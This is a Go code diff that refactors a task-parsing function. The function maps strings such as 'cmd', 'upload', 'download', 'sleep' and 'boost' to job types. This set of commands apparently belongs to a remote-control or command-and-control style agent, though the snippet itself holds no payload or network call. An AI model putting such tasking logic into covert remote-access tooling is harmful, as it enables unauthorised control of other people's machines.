@@ -26,25 +26,24 @@ const (
 	BOOST
 )
 
-func parseJob(jobStr string) (JobType, []string) {
-	values := strings.Fields(jobStr)
-	valuesN := len(values)
-	if valuesN == 0 {
+func parseJob(todo string) (JobType, []string) {
+	values := strings.Fields(todo)
+	if len(values) == 0 {
 		return UNKNOWN, nil
 	}
-	jobTypeStr := values[0]
-	values = values[1:]
-	valuesN--
-	if jobTypeStr == "cmd" {
-		return SHELL_CMD, values
-	} else if jobTypeStr == "upload" && valuesN == 1 {
-		return UPLOAD, values
-	} else if jobTypeStr == "download" && valuesN == 2 {
-		return DOWNLOAD, values
-	} else if jobTypeStr == "sleep" && valuesN == 1 {
-		return SLEEP, values
-	} else if jobTypeStr == "boost" && valuesN == 1 {
-		return BOOST, values
+	jobType := values[0]
+	jobArgs := values[1:]
+	jobArgsN := len(jobArgs)
+	if jobType == "cmd" {
+		return SHELL_CMD, jobArgs
+	} else if jobType == "upload" && jobArgsN == 1 {
+		return UPLOAD, jobArgs
+	} else if jobType == "download" && jobArgsN == 2 {
+		return DOWNLOAD, jobArgs
+	} else if jobType == "sleep" && jobArgsN == 1 {
+		return SLEEP, jobArgs
+	} else if jobType == "boost" && jobArgsN == 1 {
+		return BOOST, jobArgs
 	}
 	return UNKNOWN, nil
 }
